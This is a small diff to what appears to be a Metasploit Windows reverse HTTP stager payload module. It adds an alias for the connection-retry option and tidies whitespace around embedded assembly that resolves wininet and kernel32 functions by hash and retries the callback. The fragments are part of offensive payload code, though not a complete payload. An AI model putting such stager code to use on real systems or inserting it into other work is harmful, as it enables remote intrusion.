@@ -29,7 +29,8 @@ module Payload::Windows::ReverseHttp
     super
     register_advanced_options([
         OptInt.new('StagerURILength', [false, 'The URI length for the stager (at least 5 bytes)']),
-        OptInt.new('StagerRetryCount', [false, 'The number of times the stager should retry if the first connect fails (zero to infinite retries)', 10]),
+        OptInt.new('StagerRetryCount', [false, 'The number of times the stager should retry if the first connect fails', 10],
+          aliases: ['ReverseConnectRetries']),
         OptInt.new('StagerRetryWait', [false, 'Number of seconds to wait for the stager between reconnect attempts', 5]),
         OptString.new('PayloadProxyHost', [false, 'An optional proxy server IP address or hostname']),
         OptPort.new('PayloadProxyPort', [false, 'An optional proxy server port']),
@@ -359,14 +360,14 @@ module Payload::Windows::ReverseHttp
         push 0x7B18062D        ; hash( "wininet.dll", "HttpSendRequestA" )
         call ebp
         test eax,eax
-        jnz allocate_memory  
-   
+        jnz allocate_memory
+
      set_wait:
         push #{retry_wait}     ; dwMilliseconds
         push 0xE035F044        ; hash( "kernel32.dll", "Sleep" )
         call ebp               ; Sleep( dwMilliseconds );
       ^
-    
+
     if retry_count > 0
       asm << %Q^
         try_it_again:
